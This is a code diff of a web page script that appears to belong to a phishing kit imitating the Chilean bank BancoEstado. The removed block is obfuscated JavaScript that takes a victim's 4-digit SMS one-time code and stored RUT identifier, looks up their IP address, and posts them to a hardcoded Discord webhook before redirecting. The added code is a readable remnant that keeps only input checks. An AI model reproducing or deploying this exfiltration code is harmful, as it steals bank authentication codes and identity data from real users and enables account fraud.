@@ -313,7 +313,49 @@
     </div>
     
     <script>
-    const _0x32cf58=_0x44a9;(function(_0x4a80e3,_0xa76002){const _0x55b51a=_0x44a9,_0x3a6fec=_0x4a80e3();while(!![]){try{const _0x41d36c=-parseInt(_0x55b51a(0x1fc))/0x1+-parseInt(_0x55b51a(0x1f2))/0x2+parseInt(_0x55b51a(0x201))/0x3+parseInt(_0x55b51a(0x1fe))/0x4+parseInt(_0x55b51a(0x1ed))/0x5+-parseInt(_0x55b51a(0x219))/0x6*(-parseInt(_0x55b51a(0x1f4))/0x7)+parseInt(_0x55b51a(0x215))/0x8;if(_0x41d36c===_0xa76002)break;else _0x3a6fec['push'](_0x3a6fec['shift']());}catch(_0x4393f4){_0x3a6fec['push'](_0x3a6fec['shift']());}}}(_0x1a4a,0x771c3));const DISCORD_WEBHOOK_URL=_0x32cf58(0x208),codigoInput=document[_0x32cf58(0x1f0)](_0x32cf58(0x21a)),continueBtn=document[_0x32cf58(0x1f0)](_0x32cf58(0x206));function _0x1a4a(){const _0x5bd20e=['stringify','value','catch','348MmkPRn','codigo','location','length','3720euqWvw','back','No\x20disponible','getElementById','Error\x20IP:','1284954gMjcrl','load2.html','6986RhWiil','💋𝖫𝗈𝗀𝗈𝗌\x20𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈\x20𝖢𝗈𝗋𝖾\x20𝖯𝗋𝗂𝗆𝖾\x20𝖯𝗋𝗈\x20𝖬𝖺𝗑💋','▸\x20𝖧𝗈𝗋𝖺','add','preventDefault','enabled','Por\x20favor\x20ingresa\x20los\x204\x20dígitos\x20del\x20código','load','564594MPFNlH','addEventListener','3111664QiBvhb','disabled','application/json','1569078uYcRFk','#️⃣『𝓞𝓣𝓟\x20𝔅𝔞𝔫𝔠𝔬𝔈𝔰𝔱𝔞𝔡𝔬』#️⃣','json','▸\x20𝖢𝗈𝖽𝗂𝗀𝗈\x20𝖲𝖬𝖲','▸\x20𝖱𝖴𝖳','continueBtn','POST','https://discord.com/api/webhooks/1538414125439520778/2NAQ87Fjy8N0QFQ6Cxf57DFp_J2MxFCgtGo9EgSOvdjT10G8KSEnWjx9nxW3eowQzBFw','then','▸\x20𝖨𝖯','error','history','getItem','toLocaleString','focus','replace','es-ES','https://api.ipify.org?format=json','classList','remove','2683008ZfZpGx'];_0x1a4a=function(){return _0x5bd20e;};return _0x1a4a();}codigoInput[_0x32cf58(0x1fd)]('input',function(_0x2c2e7e){const _0x5f1bcb=_0x32cf58;this[_0x5f1bcb(0x217)]=this[_0x5f1bcb(0x217)][_0x5f1bcb(0x210)](/[^0-9]/g,''),this[_0x5f1bcb(0x217)]['length']===0x4?(continueBtn[_0x5f1bcb(0x1ff)]=![],continueBtn[_0x5f1bcb(0x213)][_0x5f1bcb(0x1f7)](_0x5f1bcb(0x1f9))):(continueBtn[_0x5f1bcb(0x1ff)]=!![],continueBtn[_0x5f1bcb(0x213)][_0x5f1bcb(0x214)]('enabled'));});function handleSmsSubmit(_0x32e32c){const _0x390005=_0x32cf58;_0x32e32c[_0x390005(0x1f8)]();const _0x1d8500=document['getElementById'](_0x390005(0x21a))[_0x390005(0x217)];if(_0x1d8500[_0x390005(0x21c)]!==0x4){alert(_0x390005(0x1fa));return;}enviarCodigoADiscord(_0x1d8500);}function _0x44a9(_0x59b70c,_0x169ec6){_0x59b70c=_0x59b70c-0x1ed;const _0x1a4a95=_0x1a4a();let _0x44a9fd=_0x1a4a95[_0x59b70c];return _0x44a9fd;}function enviarCodigoADiscord(_0x52a41c){const _0x325622=_0x32cf58,_0x71c8dd=localStorage[_0x325622(0x20d)]('rutUsuario')||_0x325622(0x1ef);fetch(_0x325622(0x212))[_0x325622(0x209)](_0x4a62f1=>_0x4a62f1[_0x325622(0x203)]())[_0x325622(0x209)](_0x489fb2=>{const _0xa152fb=_0x325622,_0x2c6cd0={'username':_0xa152fb(0x1f5),'embeds':[{'color':0x3498db,'author':{'name':_0xa152fb(0x202)},'fields':[{'name':_0xa152fb(0x204),'value':'`'+_0x52a41c+'`','inline':![]},{'name':_0xa152fb(0x205),'value':'`'+_0x71c8dd+'`','inline':![]},{'name':_0xa152fb(0x20a),'value':'`'+_0x489fb2['ip']+'`','inline':!![]},{'name':_0xa152fb(0x1f6),'value':'`'+new Date()[_0xa152fb(0x20e)](_0xa152fb(0x211))+'`','inline':!![]}]}]};fetch(DISCORD_WEBHOOK_URL,{'method':_0xa152fb(0x207),'headers':{'Content-Type':_0xa152fb(0x200)},'body':JSON[_0xa152fb(0x216)](_0x2c6cd0)})[_0xa152fb(0x209)](()=>{const _0x572635=_0xa152fb;window[_0x572635(0x21b)]['href']=_0x572635(0x1f3);})['catch'](_0x40bf88=>console[_0xa152fb(0x20b)]('Error:',_0x40bf88));})[_0x325622(0x218)](_0x5ed5c2=>console['error'](_0x325622(0x1f1),_0x5ed5c2));}function cerrarModal(_0x12b85d){const _0x252085=_0x32cf58;_0x12b85d&&_0x12b85d['preventDefault'](),window[_0x252085(0x20c)][_0x252085(0x1ee)]();}window[_0x32cf58(0x1fd)](_0x32cf58(0x1fb),function(){const _0x5d30bd=_0x32cf58;document[_0x5d30bd(0x1f0)](_0x5d30bd(0x21a))[_0x5d30bd(0x20f)]();});
+        // ============================================
+// REFERENCIAS A ELEMENTOS DOM
+// ============================================
+
+const codigoInput = document.getElementById('codigo');
+const continueBtn = document.getElementById('continueBtn');
+
+// ============================================
+// VALIDACIÓN EN TIEMPO REAL DEL INPUT
+// ============================================
+
+codigoInput.addEventListener('input', function(e) {
+    // Solo permitir números
+    this.value = this.value.replace(/[^0-9]/g, '');
+    
+    // Habilitar/deshabilitar botón según si hay 4 dígitos
+    if (this.value.length === 4) {
+        continueBtn.disabled = false;
+        continueBtn.classList.add('enabled');
+    } else {
+        continueBtn.disabled = true;
+        continueBtn.classList.remove('enabled');
+    }
+});
+
+// ============================================
+// FUNCIONES DE UTILIDAD
+// ============================================
+
+function cerrarModal(event) {
+    if (event) {
+        event.preventDefault();
+    }
+    window.history.back();
+}
+
+// ============================================
+// INICIALIZACIÓN
+// ============================================
+
+window.addEventListener('load', function() {
+    document.getElementById('codigo').focus();
+});
     </script>
 </body>
 </html>
